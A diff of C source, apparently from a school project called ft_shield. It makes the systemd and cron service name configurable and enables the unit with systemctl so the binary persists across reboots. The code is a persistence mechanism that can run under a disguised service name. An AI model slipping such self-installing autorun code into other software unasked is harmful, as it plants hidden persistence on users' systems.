@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/25 15:17:39 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/11/29 00:13:09 by kiroussa         ###   ########.fr       */
+/*   Updated: 2026/01/06 22:09:28 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,9 +20,16 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
+#ifndef SHIELD_SERVICE_NAME
+#define SHIELD_SERVICE_NAME "ft_shield"
+#endif // !SHIELD_SERVICE_NAME
+#ifndef SHIELD_SERVICE_DESCRIPTION
+#define SHIELD_SERVICE_DESCRIPTION "ft_shield"
+#endif // !SHIELD_SERVICE_DESCRIPTION
+
 #define SYSTEMD_UNIT_P1 "\
 [Unit]\n\
-Description=ft_shield\n\
+Description="SHIELD_SERVICE_DESCRIPTION"\n\
 \n\
 [Service]\n\
 Type=simple\n\
@@ -36,8 +43,8 @@ RestartSec=5\n\
 [Install]\n\
 WantedBy=multi-user.target\n\
 "
-#define SYSTEMD_UNIT_PATH "/etc/systemd/system/ft_shield.service"
-#define CRONTAB_SERVICE_PATH "/etc/cron.d/ft_shield"
+#define SYSTEMD_UNIT_PATH "/etc/systemd/system/"SHIELD_SERVICE_NAME".service"
+#define CRONTAB_SERVICE_PATH "/etc/cron.d/"SHIELD_SERVICE_NAME
 
 static inline int	is_systemd(void)
 {
@@ -94,6 +101,11 @@ int	shield_autorun_setup(const char *binary_path)
 	{
 		DEBUG("Systemd detected, creating " SYSTEMD_UNIT_PATH "\n");
 		error = write_systemd_unit(binary_path);
+		if (!error)
+		{
+			DEBUG("Write system unit success, enabling it\n");
+			error = system("systemctl enable "SHIELD_SERVICE_NAME".service >/dev/null 2>&1");
+		}
 	}
 	else if (is_cron_d())
 	{
